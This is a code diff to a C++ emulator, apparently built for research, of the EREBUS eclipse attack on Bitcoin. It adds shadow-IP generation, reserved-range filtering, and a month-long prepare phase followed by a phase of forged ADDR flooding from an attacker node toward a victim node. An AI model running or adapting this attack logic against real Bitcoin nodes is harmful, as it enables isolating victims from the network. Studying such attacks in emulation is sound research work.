@@ -23,6 +23,8 @@
 
 #include <regex>
 #include <random>
+#include <chrono>
+#include <iomanip>
 
 typedef unsigned int SOCKET;
 #define INVALID_SOCKET      (SOCKET)(~0)
@@ -1077,6 +1079,121 @@ public:
     }
 };
 
+static bool _dns_isIPInRange(const struct in_addr netIP, std::string cidrStr) {
+    auto pos = cidrStr.find('/');
+    if (pos == std::string::npos)
+        assert (0 && "wrong argument for _dns_isIPInRange");
+    std::string cidrIPStr = cidrStr.substr(0, pos);
+    std::string bits = cidrStr.substr(pos + 1);
+    int cidrBits = std::stoi(bits);
+
+    assert(cidrBits >= 0 && cidrBits <= 32);
+
+    /* first create the mask in host order */
+    in_addr_t netmask = 0;
+    for (int i = 0; i < 32; i++) {
+        /* move one so LSB is 0 */
+        netmask = netmask << 1;
+        if (cidrBits > i) {
+            /* flip the LSB */
+            netmask++;
+        }
+    }
+
+    /* flip to network order */
+    netmask = htonl(netmask);
+
+    /* get the subnet ip in network order */
+    struct in_addr subnetIP;
+    inet_pton(AF_INET, cidrIPStr.c_str(), &subnetIP);
+
+    /* all non-subnet bits should be flipped */
+    if ((netIP.s_addr & netmask) == (subnetIP.s_addr & netmask)) {
+        return true;
+    } else {
+        return false;
+    }
+}
+
+static bool _dns_isRestricted(std::string ip) {
+    struct in_addr netIP;
+    inet_pton(AF_INET, ip.c_str(), &netIP);
+    /* http://en.wikipedia.org/wiki/Reserved_IP_addresses#Reserved_IPv4_addresses */
+    if (_dns_isIPInRange(netIP, "0.0.0.0/8") ||
+        _dns_isIPInRange(netIP, "10.0.0.0/8") ||
+        _dns_isIPInRange(netIP, "100.64.0.0/10") ||
+        _dns_isIPInRange(netIP, "127.0.0.0/8") ||
+        _dns_isIPInRange(netIP, "169.254.0.0/16") ||
+        _dns_isIPInRange(netIP, "172.16.0.0/12") ||
+        _dns_isIPInRange(netIP, "192.0.0.0/29") ||
+        _dns_isIPInRange(netIP, "192.0.2.0/24") ||
+        _dns_isIPInRange(netIP, "192.88.99.0/24") ||
+        _dns_isIPInRange(netIP, "192.168.0.0/16") ||
+        _dns_isIPInRange(netIP, "198.18.0.0/15") ||
+        _dns_isIPInRange(netIP, "198.51.100.0/24") ||
+        _dns_isIPInRange(netIP, "203.0.113.0/24") ||
+        _dns_isIPInRange(netIP, "224.0.0.0/4") ||
+        _dns_isIPInRange(netIP, "240.0.0.0/4") ||
+        _dns_isIPInRange(netIP, "255.255.255.255/32")) {
+        return true;
+    } else {
+        return false;
+    }
+}
+
+static std::string _generateRandomIP() {
+    std::stringstream ss;
+    while (true) {
+        int ip[4];
+        for (int i = 0; i < 4; i++) {
+            ip[i] = rand() % 256;
+            if (ip[i] == 0)
+                ip[i]++;
+        }
+
+        if (ip[0] == 10)
+            continue;
+        if (ip[0] == 172 && ip[1] == 16)
+            continue;
+        if (ip[0] == 192 && ip[1] == 168)
+            continue;
+
+        ss.str("");
+        ss << ip[0] << "." << ip[1] << "." << ip[2] << "." << ip[3];
+
+        if (!_dns_isRestricted(ss.str()))
+            break;
+    }
+    return ss.str();
+}
+
+//template<typename MSG,
+//        bool (*ReceiveMSG)(const char *, unsigned int, std::list<MSG> &, std::list<MSG> &),
+//        bool (*ProcessMSG)(MSG &, bool, std::deque<std::vector<unsigned char>> &, std::string, uint16_t,
+//                           std::string,
+//                           bool),
+//        bool (*ForgeAddrMSG)(std::vector<std::string>, std::deque<std::vector<unsigned char>> &, std::string,
+//                             uint16_t),
+//        bool (*InitProtocol)(std::deque<std::vector<unsigned char>> &, std::string, uint16_t)>
+//class LegitimateIPFactory {
+//    double _periodTime;
+//    double _iprate; // IP per second
+//    double _reachablerate;
+//    std::vector<std::string> _vReachableIP;
+//    std::vector<std::string> _vUnreachableIP;
+//    std::shared_ptr<ActiveNode<MSG, ReceiveMSG, ProcessMSG, ForgeAddrMSG, InitProtocol> > _attackerNode;
+//
+//public:
+//    LegitimateIPFactory(double periodTime, double iprate, double reachablerate, std::vector<std::string> vReachableIP,
+//                        std::vector<std::string> vUnreachableIP,
+//                        std::shared_ptr<ActiveNode<MSG, ReceiveMSG, ProcessMSG, ForgeAddrMSG, InitProtocol>> node)
+//            : _periodTime(periodTime), _iprate(iprate), _reachablerate(reachablerate),
+//              _vReachableIP(std::move(vReachableIP)), _vUnreachableIP(std::move(vUnreachableIP)),
+//              _attackerNode(std::move(node)) {
+//
+//    }
+//};
+
 template<typename MSG,
         bool (*ReceiveMSG)(const char *, unsigned int, std::list<MSG> &, std::list<MSG> &),
         bool (*ProcessMSG)(MSG &, bool, std::deque<std::vector<unsigned char>> &, std::string, uint16_t, std::string,
@@ -1088,21 +1205,54 @@ private:
     double _iprate; // IP per second
     double _shadowrate; // shadow IP portion
     std::vector<std::string> _vLegiIP;
+    std::vector<std::string> _vUnreachLegiIP;
     std::vector<std::string> _vShadowIP;
     std::shared_ptr<ActiveNode<CNetMessage, BitcoinReceiveMsg, BitcoinProcessMsg, BitcoinForgeAddrMsg, BitcoinInitProto> > _attacker_node;
     std::vector<PassiveNode<MSG, ReceiveMSG, ProcessMSG> > _vShadowNode;
 
+    std::chrono::system_clock::time_point _prepare_start_time;
+    std::chrono::system_clock::time_point _attack_start_time;
+    bool _attack_phase = false;
 
     void _timerCallback(ev::timer &w, int revents) {
-        std::cout << "Periodic timer called" << "\n";
         std::vector<std::string> vAddr;
-        int totalIPCount = std::min(1000, (int) (_periodTime * _iprate));
-        int legiIPcount = totalIPCount * (1 - _shadowrate);
-        int shadowIPcount = totalIPCount * _shadowrate;
-        std::sample(_vLegiIP.begin(), _vLegiIP.end(), std::back_inserter(vAddr), legiIPcount,
-                    std::mt19937{std::random_device{}()});
-        std::sample(_vShadowIP.begin(), _vShadowIP.end(), std::back_inserter(vAddr), shadowIPcount,
-                    std::mt19937{std::random_device{}()});
+        auto now = std::chrono::system_clock::now();
+        auto t_c = std::chrono::system_clock::to_time_t(now);
+        std::cout << "Periodic timer called " << std::put_time(std::localtime(&t_c), "%F %T") << "\n";
+        if (now >= _attack_start_time && !_attack_phase) {
+            _attack_phase = true;
+            w.repeat = 600;
+        }
+
+        if (now < _attack_start_time) {
+            // if it's prepare phase
+            int totalIPCount = 1000;
+            int legiIPcount = totalIPCount * 0.3;
+            int unreLegiIPcount = totalIPCount * 0.7;
+            int shadowIPcount = 0;
+            std::sample(_vLegiIP.begin(), _vLegiIP.end(), std::back_inserter(vAddr), legiIPcount,
+                        std::mt19937{std::random_device{}()});
+            std::sample(_vUnreachLegiIP.begin(), _vUnreachLegiIP.end(), std::back_inserter(vAddr), unreLegiIPcount,
+                        std::mt19937{std::random_device{}()});
+            std::cout << "debug print start (prepare phase)" << "\n";
+            std::cout << "legiIPcount:" << legiIPcount << ", unreachable legiIPCount:" << unreLegiIPcount << ", shadowIPcount:" << shadowIPcount << "\n";
+        }
+        else {
+            // if it's attack phase
+            int totalIPCount = std::min(1000, (int) (_periodTime * _iprate));
+            int legiIPcount = totalIPCount * (1 - _shadowrate) * 0.3;
+            int unreLegiIPcount = totalIPCount * (1 - _shadowrate) * 0.7;
+            int shadowIPcount = totalIPCount * _shadowrate;
+
+            std::sample(_vLegiIP.begin(), _vLegiIP.end(), std::back_inserter(vAddr), legiIPcount,
+                        std::mt19937{std::random_device{}()});
+            std::sample(_vUnreachLegiIP.begin(), _vUnreachLegiIP.end(), std::back_inserter(vAddr), unreLegiIPcount,
+                        std::mt19937{std::random_device{}()});
+            std::sample(_vShadowIP.begin(), _vShadowIP.end(), std::back_inserter(vAddr), shadowIPcount,
+                        std::mt19937{std::random_device{}()});
+            std::cout << "debug print start (attack phase)" << "\n";
+            std::cout << "legiIPcount:" << legiIPcount << ", unreachable legiIPCount:" << unreLegiIPcount << ", shadowIPcount:" << shadowIPcount << "\n";
+        }
 
 //        for (int i = 0; i < shadowIPcount; i++) {
 //            std::string randIP = _generateRandomIP();
@@ -1111,8 +1261,6 @@ private:
 //            _vShadowNode.emplace_back(randIP, 8333, true);
 //        }
 
-        std::cout << "debug print start" << "\n";
-        std::cout << "legiIPcount:" << legiIPcount << ", shadowIPcount:" << shadowIPcount << "\n";
         int cur_time = GetTime();
         std::cout << "cur_time:" << cur_time << "\n";
         int shadow_outgoing_count = 0;
@@ -1133,113 +1281,25 @@ private:
         _attacker_node->SendAddr(vAddr);
     }
 
-    bool _dns_isIPInRange(const struct in_addr netIP, std::string cidrStr) {
-        auto pos = cidrStr.find('/');
-        if (pos == std::string::npos)
-            assert (0 && "wrong argument for _dns_isIPInRange");
-        std::string cidrIPStr = cidrStr.substr(0, pos);
-        std::string bits = cidrStr.substr(pos + 1);
-        int cidrBits = std::stoi(bits);
-
-        assert(cidrBits >= 0 && cidrBits <= 32);
-
-        /* first create the mask in host order */
-        in_addr_t netmask = 0;
-        for (int i = 0; i < 32; i++) {
-            /* move one so LSB is 0 */
-            netmask = netmask << 1;
-            if (cidrBits > i) {
-                /* flip the LSB */
-                netmask++;
-            }
-        }
-
-        /* flip to network order */
-        netmask = htonl(netmask);
-
-        /* get the subnet ip in network order */
-        struct in_addr subnetIP;
-        inet_pton(AF_INET, cidrIPStr.c_str(), &subnetIP);
-
-        /* all non-subnet bits should be flipped */
-        if ((netIP.s_addr & netmask) == (subnetIP.s_addr & netmask)) {
-            return true;
-        } else {
-            return false;
-        }
-    }
-
-    bool _dns_isRestricted(std::string ip) {
-        struct in_addr netIP;
-        inet_pton(AF_INET, ip.c_str(), &netIP);
-        /* http://en.wikipedia.org/wiki/Reserved_IP_addresses#Reserved_IPv4_addresses */
-        if (_dns_isIPInRange(netIP, "0.0.0.0/8") ||
-            _dns_isIPInRange(netIP, "10.0.0.0/8") ||
-            _dns_isIPInRange(netIP, "100.64.0.0/10") ||
-            _dns_isIPInRange(netIP, "127.0.0.0/8") ||
-            _dns_isIPInRange(netIP, "169.254.0.0/16") ||
-            _dns_isIPInRange(netIP, "172.16.0.0/12") ||
-            _dns_isIPInRange(netIP, "192.0.0.0/29") ||
-            _dns_isIPInRange(netIP, "192.0.2.0/24") ||
-            _dns_isIPInRange(netIP, "192.88.99.0/24") ||
-            _dns_isIPInRange(netIP, "192.168.0.0/16") ||
-            _dns_isIPInRange(netIP, "198.18.0.0/15") ||
-            _dns_isIPInRange(netIP, "198.51.100.0/24") ||
-            _dns_isIPInRange(netIP, "203.0.113.0/24") ||
-            _dns_isIPInRange(netIP, "224.0.0.0/4") ||
-            _dns_isIPInRange(netIP, "240.0.0.0/4") ||
-            _dns_isIPInRange(netIP, "255.255.255.255/32")) {
-            return true;
-        } else {
-            return false;
-        }
-    }
-
-    std::string _generateRandomIP() {
-        std::stringstream ss;
-        while (true) {
-            int ip[4];
-            for (int i = 0; i < 4; i++) {
-                ip[i] = rand() % 256;
-                if (ip[i] == 0)
-                    ip[i]++;
-            }
-
-            if (ip[0] == 10)
-                continue;
-            if (ip[0] == 172 && ip[1] == 16)
-                continue;
-            if (ip[0] == 192 && ip[1] == 168)
-                continue;
-
-            ss.str("");
-            ss << ip[0] << "." << ip[1] << "." << ip[2] << "." << ip[3];
-
-            if (_dns_isRestricted(ss.str()))
-                continue;
-
-            if (std::find(_vLegiIP.begin(), _vLegiIP.end(), ss.str()) == _vLegiIP.end() &&
-                std::find(_vShadowIP.begin(), _vShadowIP.end(), ss.str()) == _vShadowIP.end())
-                break;
-        }
-        return ss.str();
-    }
-
 public:
     ShadowIPFactory(double periodTime, double iprate, double shadowrate, std::vector<std::string> vIP,
+                    std::vector<std::string> vUnreIP, std::vector<std::string> vShadowIP,
                     std::shared_ptr<ActiveNode<CNetMessage, BitcoinReceiveMsg, BitcoinProcessMsg, BitcoinForgeAddrMsg, BitcoinInitProto>> node)
-            : _periodTime(periodTime), _iprate(iprate), _shadowrate(shadowrate), _vLegiIP(vIP), _attacker_node(node) {
+            : _periodTime(periodTime), _iprate(iprate), _shadowrate(shadowrate), _vLegiIP(std::move(vIP)),
+              _vUnreachLegiIP(std::move(vUnreIP)), _vShadowIP(std::move(vShadowIP)), _attacker_node(std::move(node)) {
         std::cout << "ShadowIPGenerator constructor" << "\n";
         _timer.set<ShadowIPFactory, &ShadowIPFactory::_timerCallback>(this);
-        _timer.set(_periodTime, _periodTime);
+        _timer.set(15, _periodTime);
         _timer.start();
 
-        int shadowIPtotalcount = 200000;
-        for (int i = 0; i < shadowIPtotalcount; i++) {
-            std::string randIP = _generateRandomIP();
-            _vShadowIP.push_back(randIP);
-            _vShadowNode.emplace_back(randIP, 8333, true);
+        // register virtual Node structure (including a virtual NIC) for shadow IPs
+        for (auto shadowIP : _vShadowIP) {
+            _vShadowNode.emplace_back(shadowIP, 8333, true);
         }
+
+        // set time
+        _prepare_start_time = std::chrono::system_clock::now();
+        _attack_start_time = _prepare_start_time + std::chrono::hours(30*24); // 1 month
     }
 };
 
@@ -1289,7 +1349,7 @@ int main(int argc, char *argv[]) {
     using namespace std::literals;
     std::cout << "C++20"sv.starts_with('C') << "\n";
 
-    // Update IP table
+    // Collect 100,000 reachable legitimate IPs from churn.txt
     std::ifstream read("churn.txt");
     std::map<std::string, int> mIpDuration;
     std::regex re("\\d+\\.\\d+\\.\\d+\\.\\d+");
@@ -1300,7 +1360,7 @@ int main(int argc, char *argv[]) {
         std::string ip = line.substr(0, pos);
         int duration = std::stoi(line.substr(pos));
 
-        if (std::regex_match(ip, re)) {
+        if (duration > 0 && std::regex_match(ip, re)) {
             mIpDuration.emplace(ip, duration);
             ipCount++;
             if (ipCount >= 100000)
@@ -1310,27 +1370,52 @@ int main(int argc, char *argv[]) {
     std::cout << "IP table updated. Count = " << mIpDuration.size() << "\n";
 
 
-    std::vector<std::string> vIp;
-    std::vector<int> vDuration;
-    for (const auto &[key, value] : mIpDuration) {
-        vIp.push_back(key);
-        vDuration.push_back(value);
-    }
-    // std::random_shuffle(vDuration.begin(), vDuration.end());
-//     std::random_shuffle(vIp.begin(), vIp.end());
-
-
     std::vector<PassiveNode<CNetMessage, BitcoinReceiveMsg, BitcoinProcessMsg> > vPassiveNode;
-    for (int i = 0; i < vIp.size(); i++) {
-        auto ip = vIp[i];
+    std::vector<std::string> vReachableIp;
+    //std::vector<int> vDuration;
+    for (const auto &[ip, duration] : mIpDuration) {
+        vReachableIp.push_back(ip);
         vPassiveNode.emplace_back(ip, 8333);
-        vPassiveNode.back().SetChurnOutTimer(vDuration[i]);
-        std::cout << "IP:" << ip << ", duration:" << vDuration[i] << "\n";
+        vPassiveNode.back().SetChurnOutTimer(duration);
+        std::cout << "IP:" << ip << ", duration:" << duration << "\n";
     }
+
 
     exported_main();
 
     std::cout << "Starting ISP-server for emulated benign&attacker nodes" << "\n";
+
+    std::set<std::string> sLegiIP(vReachableIp.begin(), vReachableIp.end());
+    std::set<std::string> sUnreachLegiIP;
+    std::set<std::string> sShadowIP;
+
+    // Collect 1,000,000 unreachable legitimate IPs
+    int unreachableIPtotalcount = 1000000;
+    for (int i = 0; i < unreachableIPtotalcount; i++) {
+        while (true) {
+            std::string randIP = _generateRandomIP();
+
+            if (!sLegiIP.contains(randIP) && !sUnreachLegiIP.contains(randIP)) {
+                sUnreachLegiIP.insert(randIP);
+                break;
+            }
+        }
+    }
+
+    std::cout << "unreachable legitimate IPs are collected" << "\n";
+
+    // Collect 200,000 shadow IPs
+    int shadowIPtotalcount = 200000;
+    for (int i = 0; i < shadowIPtotalcount; i++) {
+        while(true) {
+            std::string randIP = _generateRandomIP();
+            if (!sLegiIP.contains(randIP) && !sUnreachLegiIP.contains(randIP) && !sShadowIP.contains(randIP)) {
+                sShadowIP.insert(randIP);
+                break;
+            }
+        }
+    }
+    std::cout << "shadow IPs are collected" << "\n";
 
 
     // Step 1. Prepare an attacker node which connects to Bitcoin victim (thus become an inbound connection of bitcoin victim)
@@ -1339,22 +1424,25 @@ int main(int argc, char *argv[]) {
     attacker_node1->Connect("1.0.0.1", 18333);
 
 
-    // Step 2. send a ADDR msg to the Bitcoin victim to indicate him establish outgoing connections.
-    int start_time = 15;
-    int ip_total_count = vIp.size();
-    std::vector<AddrTimer> timers;
-    for (int i = 0; i < ip_total_count / 1000; i++) {
-        timers.emplace_back(start_time + i,
-                            std::vector<std::string>(vIp.begin() + i * 1000, vIp.begin() + (i + 1) * 1000),
-                            attacker_node1);
-    }
-    timers.emplace_back(start_time + ip_total_count / 1000 + 1,
-                        std::vector<std::string>(vIp.begin() + (ip_total_count / 1000) * 1000, vIp.end()),
-                        attacker_node1);
+//    // Step 2. send a ADDR msg to the Bitcoin victim to indicate him establish outgoing connections.
+//    int start_time = 15;
+//    int ip_total_count = vReachableIp.size();
+//    std::vector<AddrTimer> timers;
+//    for (int i = 0; i < ip_total_count / 1000; i++) {
+//        timers.emplace_back(start_time + i,
+//                            std::vector<std::string>(vReachableIp.begin() + i * 1000, vReachableIp.begin() + (i + 1) * 1000),
+//                            attacker_node1);
+//    }
+//    timers.emplace_back(start_time + ip_total_count / 1000 + 1,
+//                        std::vector<std::string>(vReachableIp.begin() + (ip_total_count / 1000) * 1000, vReachableIp.end()),
+//                        attacker_node1);
 
 
+
+    std::vector<std::string> vUnreLegiIP(sUnreachLegiIP.begin(), sUnreachLegiIP.end());
+    std::vector<std::string> vShadowIP(sShadowIP.begin(), sShadowIP.end());
     // Step 3. Initiate EREBUS attack using randomly created shadow IPs
-    ShadowIPFactory<CNetMessage, BitcoinReceiveMsg, BitcoinProcessMsg> pAddrTimer(600, 2, 0.9, vIp, attacker_node1);
+    ShadowIPFactory<CNetMessage, BitcoinReceiveMsg, BitcoinProcessMsg> shadowIPFactory(900, 2, 0.9, vReachableIp, vUnreLegiIP, vShadowIP, attacker_node1);
 
 
 
